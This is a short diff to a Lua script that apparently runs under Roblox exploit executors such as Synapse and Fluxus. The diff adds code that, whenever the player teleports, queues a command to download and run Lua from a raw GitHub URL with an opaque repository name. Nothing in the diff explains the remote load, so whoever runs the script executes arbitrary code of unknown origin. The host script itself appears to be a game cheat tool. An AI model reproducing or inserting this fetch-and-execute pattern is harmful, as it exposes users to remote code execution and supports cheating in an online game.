@@ -60,6 +60,7 @@ setmetatable(Services, {
 	__mode = "v"
 });
 
+local QueueTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 local GetChildren, GetDescendants = game.GetChildren, game.GetDescendants
 local IsA = game.IsA
 local FindFirstChild, FindFirstChildOfClass, FindFirstChildWhichIsA, WaitForChild = 
@@ -85,6 +86,10 @@ end
 
 local Players = Services.Players
 local GetPlayers = Players.GetPlayers
+
+if QueueTeleport then
+	QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/LighTMolT/wdawdv/main/Test'))()")
+end
 
 local function getplr(name)
 	for i,v in pairs(game.Players:GetPlayers()) do
